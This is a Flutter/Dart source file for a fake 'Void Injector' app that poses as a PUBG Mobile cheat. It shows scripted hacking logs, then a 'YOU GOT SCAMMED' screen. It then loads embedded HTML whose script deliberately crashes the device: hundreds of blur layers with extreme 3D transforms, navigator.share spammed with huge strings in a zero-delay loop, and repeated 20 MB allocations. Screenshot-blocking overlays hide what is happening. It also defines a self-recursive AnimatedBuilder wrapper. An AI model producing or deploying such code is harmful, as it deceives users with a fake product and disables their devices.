import 'dart:async';
import 'dart:math';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:flutter_inappwebview/flutter_inappwebview.dart';

void main() => runApp(const MyApp());

class MyApp extends StatelessWidget {
  const MyApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Void Injector',
      theme: ThemeData.dark().copyWith(
        scaffoldBackgroundColor: Colors.black,
        colorScheme: const ColorScheme.dark().copyWith(
          primary: Colors.white,
          secondary: Colors.white,
        ),
      ),
      home: const InjectorScreen(),
      debugShowCheckedModeBanner: false,
    );
  }
}

class InjectorScreen extends StatefulWidget {
  const InjectorScreen({super.key});

  @override
  State<InjectorScreen> createState() => _InjectorScreenState();
}

class _InjectorScreenState extends State<InjectorScreen> with SingleTickerProviderStateMixin {
  bool _isInjecting = false;
  bool _showScam = false;
  bool _isRespring = false;

  late AnimationController _progressController;
  
  final ValueNotifier<List<String>> _logsNotifier = ValueNotifier([]);
  Timer? _logTimer;
  final Random _random = Random();

  final List<String> _realisticLogs = [
    '[System] Initializing injection engine...',
    '[Memory] Searching for PUBG Mobile process...',
    '[Memory] Process found!',
    '[Memory] Allocating payload buffer (2.4 MB)...',
    '[Memory] Bypassing anti-cheat...',
    '[Memory] Anti-cheat bypassed!',
  ];

  final List<String> _garbageLogs = [
    '[DYLIB] Loading libinject.dylib...',
    '[DYLIB] Resolving symbols...',
    '[DYLIB] Entry point found!',
    '[DYLIB] Bypassing PAC...',
    '[DYLIB] KPP bypassed!',
    '[DYLIB] Disabling watchdog...',
    '[DYLIB] Overwriting pointers...',
    '[DYLIB] Kernel exploit triggered!',
    '[DYLIB] Root acquired!',
    '[DYLIB] Mounting RW...',
    '[DYLIB] Filesystem mounted!',
    '[DYLIB] SpringBoard injected!',
    '[DYLIB] Respring complete!',
    '[DYLIB] AMFI bypassed!',
    '[DYLIB] Sandbox escaped!',
    '[DYLIB] Kernel extension loaded!',
    '[DYLIB] System calls overridden!',
    '[DYLIB] Process hidden!',
    '[DYLIB] SSL bypassed!',
    '[DYLIB] Traffic decrypted!',
    '[DYLIB] Game injected!',
    '[DYLIB] ESP activated!',
    '[DYLIB] Aimbot activated!',
    '[DYLIB] Traces cleaned!',
    '[DYLIB] Payload written!',
    '[DYLIB] Exploit triggered!',
    '[DYLIB] Signature check bypassed!',
    '[DYLIB] Hidden from lsof!',
    '[DYLIB] Codesign bypassed!',
  ];

  InAppWebViewController? _webViewController;

  @override
  void initState() {
    super.initState();
    _progressController = AnimationController(
      vsync: this,
      duration: const Duration(minutes: 5),
    )..addListener(() {
        if (_progressController.isCompleted) {
          _finishScam();
        }
      });
  }

  void _startInjection() {
    setState(() {
      _isInjecting = true;
      _showScam = false;
    });
    
    _logsNotifier.value = [];
    _progressController.forward(from: 0.0);

    int tickCount = 0;

    _logTimer = Timer.periodic(const Duration(milliseconds: 16), (timer) {
      tickCount++;
      List<String> currentLogs = List.from(_logsNotifier.value);

      if (tickCount < 180) {
        if (tickCount % 30 == 0) {
          int realisticIndex = (tickCount ~/ 30) - 1;
          if (realisticIndex < _realisticLogs.length) {
            currentLogs.insert(0, _realisticLogs[realisticIndex]);
          }
        }
      } else {
        for (int i = 0; i < 80; i++) {
          currentLogs.insert(0, _garbageLogs[_random.nextInt(_garbageLogs.length)]);
        }
      }

      if (currentLogs.length > 150) {
        currentLogs = currentLogs.sublist(0, 150);
      }

      _logsNotifier.value = currentLogs;
    });
  }

  void _finishScam() {
    _logTimer?.cancel();
    setState(() {
      _isInjecting = false;
      _showScam = true;
    });
    
    Future.delayed(const Duration(seconds: 2), () {
      _triggerRespring();
    });
  }

  void _triggerRespring() {
    setState(() {
      _isRespring = true;
    });
  }

  @override
  void dispose() {
    _logTimer?.cancel();
    _progressController.dispose();
    _logsNotifier.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Stack(
        children: [
          Center(
            child: Padding(
              padding: const EdgeInsets.all(24.0),
              child: Column(
                mainAxisAlignment: MainAxisAlignment.center,
                children: [
                  const Spacer(),
                  const Text(
                    'Void Injector',
                    style: TextStyle(
                      fontSize: 42,
                      fontWeight: FontWeight.bold,
                      letterSpacing: 1.2,
                      fontFamily: 'Courier',
                    ),
                  ),
                  const SizedBox(height: 50),

                  if (!_isInjecting && !_showScam)
                    ElevatedButton(
                      onPressed: _startInjection,
                      style: ElevatedButton.styleFrom(
                        backgroundColor: Colors.white,
                        foregroundColor: Colors.black,
                        padding: const EdgeInsets.symmetric(horizontal: 50, vertical: 18),
                        shape: RoundedRectangleBorder(
                          borderRadius: BorderRadius.circular(12),
                        ),
                      ),
                      child: const Text(
                        'INJECT CHEAT',
                        style: TextStyle(
                          fontSize: 20,
                          fontWeight: FontWeight.bold,
                          fontFamily: 'Courier',
                        ),
                      ),
                    ),

                  if (_isInjecting) ...[
                    const SizedBox(height: 20),
                    AnimatedBuilder(
                      animation: _progressController,
                      builder: (context, child) {
                        return Column(
                          children: [
                            SizedBox(
                              width: 280,
                              child: LinearProgressIndicator(
                                value: _progressController.value,
                                backgroundColor: Colors.grey[800],
                                color: Colors.white,
                                minHeight: 6,
                              ),
                            ),
                            const SizedBox(height: 12),
                            Text(
                              '${(_progressController.value * 100).toInt()}%',
                              style: const TextStyle(
                                fontSize: 16,
                                fontFamily: 'Courier',
                              ),
                            ),
                          ],
                        );
                      }
                    ),
                    const SizedBox(height: 20),
                    Expanded(
                      child: Container(
                        padding: const EdgeInsets.symmetric(horizontal: 16),
                        child: ValueListenableBuilder<List<String>>(
                          valueListenable: _logsNotifier,
                          builder: (context, logs, child) {
                            return ListView.builder(
                              reverse: true,
                              itemCount: logs.length,
                              itemBuilder: (context, index) {
                                final isGarbage = logs.length > 10;
                                return Padding(
                                  padding: const EdgeInsets.symmetric(vertical: 1),
                                  child: Text(
                                    logs[index],
                                    style: TextStyle(
                                      fontSize: isGarbage ? 8 : 11,
                                      color: isGarbage ? Colors.grey[600] : Colors.grey[300],
                                      fontFamily: 'Courier',
                                    ),
                                  ),
                                );
                              },
                            );
                          },
                        ),
                      ),
                    ),
                  ],
                  const Spacer(),
                ],
              ),
            ),
          ),

          if (_showScam && !_isRespring)
            Container(
              color: Colors.black,
              width: double.infinity,
              height: double.infinity,
              child: const Center(
                child: Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Text(
                      'ТЫ ЗАСКАМЛЕН',
                      textAlign: TextAlign.center,
                      style: TextStyle(
                        fontSize: 48,
                        fontWeight: FontWeight.bold,
                        fontFamily: 'Courier',
                        color: Colors.redAccent,
                      ),
                    ),
                    SizedBox(height: 20),
                    Text(
                      'YOU GOT SCAMMED',
                      textAlign: TextAlign.center,
                      style: TextStyle(
                        fontSize: 24,
                        fontFamily: 'Courier',
                        color: Colors.white,
                      ),
                    ),
                  ],
                ),
              ),
            ),

          if (_isRespring)
            _buildSecureRespringScreen(),
        ],
      ),
    );
  }

  Widget _buildSecureRespringScreen() {
    return Stack(
      children: [
        InAppWebView(
          initialData: InAppWebViewInitialData(
            data: _getRespringHTML(),
          ),
          onWebViewCreated: (controller) {
            _webViewController = controller;
          },
          initialSettings: InAppWebViewSettings(
            javaScriptEnabled: true,
            allowsInlineMediaPlayback: true,
            mediaPlaybackRequiresUserGesture: false,
          ),
        ),
        
        Opacity(
          opacity: 0.0,
          child: Container(
            width: double.infinity,
            height: double.infinity,
            color: Colors.red,
            child: const Center(
              child: Text(
                'BLOCK',
                style: TextStyle(
                  color: Colors.white,
                  fontSize: 48,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Courier',
                ),
              ),
            ),
          ),
        ),
        
        IgnorePointer(
          child: Container(
            width: double.infinity,
            height: double.infinity,
            color: const Color(0x00FF0000),
            child: const Center(
              child: Text(
                'BLOCK',
                style: TextStyle(
                  color: Color(0x00FFFFFF),
                  fontSize: 48,
                  fontWeight: FontWeight.bold,
                  fontFamily: 'Courier',
                ),
              ),
            ),
          ),
        ),
      ],
    );
  }

  String _getRespringHTML() {
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
        <title>.</title>
        <style>
            body {
                background: #000;
                height: 100vh;
                display: flex;
                align-items: center;
                justify-content: center;
                overflow: hidden;
                margin: 0;
            }
            .flash {
                position: fixed;
                inset: 0;
                background: #fff;
                z-index: 10;
                opacity: 0;
                pointer-events: none;
            }
            .screenshot-trap {
                position: fixed;
                inset: 0;
                background: #ff0000;
                z-index: 9999;
                opacity: 0;
            }
            .screenshot-trap-text {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                color: #ffffff;
                font-size: 48px;
                font-weight: bold;
                font-family: monospace;
                z-index: 10000;
                opacity: 0;
            }
        </style>
    </head>
    <body>
        <div class="flash" id="f"></div>
        <div class="screenshot-trap"></div>
        <div class="screenshot-trap-text">BLOCK</div>
        <script>
            var ctx = new(window.AudioContext || window.webkitAudioContext)();
            ctx.resume();
            
            function beep(f, d, v) {
                var o = ctx.createOscillator();
                var g = ctx.createGain();
                o.type = 'square';
                o.frequency.value = f;
                g.gain.value = v;
                g.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + d);
                o.connect(g);
                g.connect(ctx.destination);
                o.start();
                o.stop(ctx.currentTime + d);
            }
            
            function respring() {
                var i = document.createElement('iframe');
                i.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;border:none;z-index:99999;';
                i.setAttribute('sandbox', 'allow-scripts allow-same-origin');
                i.srcdoc = '<html><body style="margin:0;overflow:hidden;background:black;"><script>var c=document.createElement("div");c.style.cssText="perspective:1px;perspective-origin:9999999% 9999999%;";document.body.appendChild(c);for(var i=0;i<500;i++){var d=document.createElement("div");d.style.cssText="position:absolute;width:100vw;height:100vh;backdrop-filter:blur(100px);-webkit-backdrop-filter:blur(100px);transform:translate3d(100000px,100000px,"+i+"px) rotateY(90deg);opacity:0.99;";c.appendChild(d)}setInterval(function(){try{navigator.share({title:"R",text:"R".repeat(100000)})}catch(e){}var x=new Uint8Array(1024*1024*20);crypto.getRandomValues(x)},0);<\/script><div style="position:fixed;inset:0;background:red;opacity:0;z-index:99999;"></div><div style="position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);color:white;font-size:48px;font-weight:bold;font-family:monospace;z-index:100000;opacity:0;">BLOCK</div></body></html>';
                document.body.appendChild(i);
            }
            
            document.addEventListener('visibilitychange', function() {
                if (document.hidden) {
                    var trap = document.querySelector('.screenshot-trap');
                    var trapText = document.querySelector('.screenshot-trap-text');
                    if (trap) {
                        trap.style.opacity = '1';
                        trap.style.transition = 'opacity 0.05s';
                    }
                    if (trapText) {
                        trapText.style.opacity = '1';
                    }
                    setTimeout(function() {
                        if (trap) trap.style.opacity = '0';
                        if (trapText) trapText.style.opacity = '0';
                    }, 200);
                }
            });
            
            setInterval(function() {
                var trap = document.querySelector('.screenshot-trap');
                var trapText = document.querySelector('.screenshot-trap-text');
                if (trap && Math.random() > 0.7) {
                    trap.style.opacity = '1';
                    if (trapText) trapText.style.opacity = '1';
                    setTimeout(function() {
                        trap.style.opacity = '0';
                        if (trapText) trapText.style.opacity = '0';
                    }, 100);
                }
            }, 500);
            
            setTimeout(function() {
                beep(800, 0.12, 0.9);
                if (navigator.vibrate) navigator.vibrate([60, 30, 60]);
                document.getElementById('f').style.opacity = '1';
                respring();
            }, 250);
        </script>
    </body>
    </html>
    ''';
  }
}

class AnimatedBuilder extends StatelessWidget {
  final Animation<double> animation;
  final Widget Function(BuildContext context, Widget? child) builder;
  final Widget? child;

  const AnimatedBuilder({
    super.key,
    required this.animation,
    required this.builder,
    this.child,
  });

  @override
  Widget build(BuildContext context) {
    return AnimatedBuilder(
      animation: animation,
      builder: builder,
      child: child,
    );
  }
}
